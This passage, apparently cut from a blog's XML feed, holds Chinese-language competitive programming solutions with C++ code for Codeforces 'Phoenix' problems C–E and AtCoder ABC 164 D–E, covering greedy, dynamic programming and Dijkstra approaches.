operator">&lt;&lt;</span> vec<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="C-Phoenix-and-Distribution"><a href="#C-Phoenix-and-Distribution" class="headerlink" title="C. Phoenix and Distribution"></a>C. Phoenix and Distribution</h2><ul><li><p>题意:<br>给定两个数字 $n,k$ ,和包含n个字母的字符串,让你讲这个串以任意序列分割成 $k$ 份,定义一个 $max$ 表示分割完成后字典序最大的字符串,求出最小字符串 $max$.</p></li><li><p>题解:<br>先排序,然后将k个字符串多分配一个字母,以确保非空.之后看剩下的字母种类,如果只剩下一种字母,则循环分配 ; 如果剩下的字母大于一种,则将所有串都分配到字典序最小的那个串上.之后将分好的串排序,即可得到答案.</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string s<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">vec</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> fla <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> k <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>fla<span class="token punctuation">)</span>            pos<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            fla <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    pos<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">//  cout &lt;&lt; pos &lt;&lt; "\n";</span>    set<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> st<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> k<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        st<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>st<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token operator">=</span>k<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            vec<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>            tmp<span class="token operator">++</span><span class="token punctuation">;</span>            tmp <span class="token operator">%=</span> pos<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> k<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="D-Phoenix-and-Science"><a href="#D-Phoenix-and-Science" class="headerlink" title="D. Phoenix and Science"></a>D. Phoenix and Science</h2><ul><li><p>题意:<br>给一个数 $n$ , 现存在一种细菌, 在白天可以分裂/不分裂,晚上所有细菌重量均+1,使用最小的天数,使得细菌总量恰好等于 $n$ .</p></li><li><p>题解:<br>贪心分裂,如果碰到了总数大于 $n$ 的情况,则回退,然后在将未超出部分添加到答案. 排序输出.这题调了好久QAQ.</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> ans<span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">// ans.push_back(0);</span>    <span class="token comment">// while (sum&lt;n)</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     sum += (1 &lt;&lt; i);</span>    <span class="token comment">//     ans.push_back(i);</span>    <span class="token comment">//     i++;</span>    <span class="token comment">// &#125;</span>    <span class="token comment">// if(sum==n)</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     cout &lt;&lt; (int)ans.size()  &lt;&lt; "\n";</span>    <span class="token comment">//     for (int i = 1;i&lt;(int)ans.size();i++)</span>    <span class="token comment">//         cout &lt;&lt; ans[i] &lt;&lt; " ";</span>    <span class="token comment">//     cout &lt;&lt; "\n";</span>    <span class="token comment">// &#125;</span>    <span class="token comment">// else</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     i--;</span>    <span class="token comment">//     sum -= (1 &lt;&lt; i);</span>    <span class="token comment">//     int tmp = n - sum;</span>    <span class="token comment">//     ans.pop_back();</span>    <span class="token comment">//     //  cout &lt;&lt; ".....................   ";</span>    <span class="token comment">//     //cout &lt;&lt; n &lt;&lt; " " &lt;&lt; sum &lt;&lt; " " &lt;&lt; tmp &lt;&lt; "\n";</span>    <span class="token comment">//     ans.push_back(tmp);</span>    <span class="token comment">//     sort(ans.begin(), ans.end());</span>    <span class="token comment">//     cout &lt;&lt; (int)ans.size()  &lt;&lt; "\n";</span>    <span class="token comment">//     for (int i = 1;i&lt;(int)ans.size();i++)</span>    <span class="token comment">//     &#123;</span>    <span class="token comment">//         if(i+1!=ans.size()&amp;&amp; ans[i]==ans[i+1])</span>    <span class="token comment">//             cout &lt;&lt; 0 &lt;&lt; " ";</span>    <span class="token comment">//         else</span>    <span class="token comment">//             cout &lt;&lt; ans[i] &lt;&lt; " ";</span>    <span class="token comment">//     &#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">&lt;&lt;=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        n <span class="token operator">-=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> ans<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>ans<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ans<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> ans<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Phoenix-and-Berries"><a href="#E-Phoenix-and-Berries" class="headerlink" title="E. Phoenix and Berries"></a>E. Phoenix and Berries</h2><ul><li><p>题意:<br>给 $n$ 个灌木丛和 容积为 $k$ 的袋子,n个灌木丛分别由 $a_i$ 个红浆果和 $b_i$ 个红浆果. 同种颜色或者同一个浆果丛的浆果可以放到同一个袋子里.求出能放满的袋子的最大数量.</p></li><li><p>题解:<br>发现对于所有浆果而言,能放满的袋子数量最大为 $max((suma+sumb)/k , suma+sumb)/k-1)$ .<br>我们可以使用dp求解. $dp[i][j]$ 表示到第 $i$ 个灌木丛,剩下 $j$ 个红浆果能否达到.</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll suma <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sumb <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        suma <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> sumb <span class="token operator">+=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>j <span class="token operator">-</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> k <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//当前红浆果的</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;=</span> <span class="token function">min</span><span class="token punctuation">(</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span>                 <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>x<span class="token punctuation">)</span><span class="token operator">%</span>k<span class="token operator">+</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>=</span>k<span class="token punctuation">)</span>          <span class="token comment">//使用同一种灌木丛的蓝浆果是否能满足</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>j <span class="token operator">-</span> x <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    ll ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> <span class="token punctuation">(</span>suma <span class="token operator">+</span> sumb <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">/</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder ABC 164</title>
      <link href="/2020/04/27/AtCoder-ABC-164/"/>
      <url>/2020/04/27/AtCoder-ABC-164/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="AtCoder-ABC-164-D-E"><a href="#AtCoder-ABC-164-D-E" class="headerlink" title="AtCoder ABC 164 (D~E)"></a>AtCoder ABC 164 (D~E)</h1><ul><li>前言:<br>这次的abc f太难了，补不动，QAQ。</li></ul><h2 id="D-Multiple-of-2019"><a href="#D-Multiple-of-2019" class="headerlink" title="D. Multiple of 2019"></a>D. Multiple of 2019</h2><ul><li><p>题意:<br>给定一串包含数字(1~9)的串,让你求出有多少个子串满足是2019倍数。</p></li><li><p>题解:<br>假设一个数是$a[6]$,可以发现如果一个数是2019的倍数，那么$a[1~5]<em>10%2019+a[6]$也还是2019的倍数；并且将$(a[i] </em>  10^k +a[i+1]) mod 2019$ 存储起来，碰到余数存在的相同，就可以发现这两个数之间是存在2019的倍数的。</p></li><li><p>NOTE:<br>是不能正的处理的，我们会发现如果正的处理，当存在一个2019的倍数时，就会被模变成0，则无法对接下来的数串有贡献。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">string s<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>mod <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>mod <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> lst <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">// for (int i = 0; i &lt; (int)s.size(); i++)</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     tmp = s[i] - '0';</span>    <span class="token comment">//     lst = (lst * 10 + tmp) % mod;</span>    <span class="token comment">//     cout &lt;&lt; lst &lt;&lt; "\n";</span>    <span class="token comment">//     cnt += a[lst]++;</span>    <span class="token comment">// &#125;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        lst <span class="token operator">+=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">)</span> <span class="token operator">*</span> p<span class="token punctuation">;</span>        lst <span class="token operator">%=</span> <span class="token number">2019</span><span class="token punctuation">;</span>     <span class="token comment">//   cout &lt;&lt; lst &lt;&lt; " " &lt;&lt; a[lst] &lt;&lt; "\n";</span>        cnt <span class="token operator">+=</span> a<span class="token punctuation">[</span>lst<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        p <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">;</span>        p <span class="token operator">%=</span> <span class="token number">2019</span><span class="token punctuation">;</span>        <span class="token comment">// cout &lt;&lt; v &lt;&lt; endl;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> cnt <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Two-Currencies"><a href="#E-Two-Currencies" class="headerlink" title="E. Two Currencies"></a>E. Two Currencies</h2><ul><li><p>题意:<br>有$n$个城市，$m$条路，$s$个银币，每条路需要花费$A_i$个银币和$B_i$ 分钟，可以在第$i$个城市花费$D_i$分钟获得$C_i$个银币，求从1到2—&gt;$n$需要最少花费的时间。</p></li><li><p>题解:<br>考虑数据范围，发现只要获得2500枚银币以上，就可以完全跑完全程。于是可以想到dp,$dp[i][j]$表示到第i个城市，身上有$j$个银币所花费的最小时间。使用Dijkstra算法进行dp即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">2600</span><span class="token punctuation">;</span><span class="token keyword">const</span> ll inf <span class="token operator">=</span> <span class="token number">1e18</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>ll s<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>ll dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">;</span>ll c<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dijk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> maxn<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> tot<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    priority_queue<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span> greater<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">>></span> pq<span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> s<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> tp<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tp <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> nowpos <span class="token 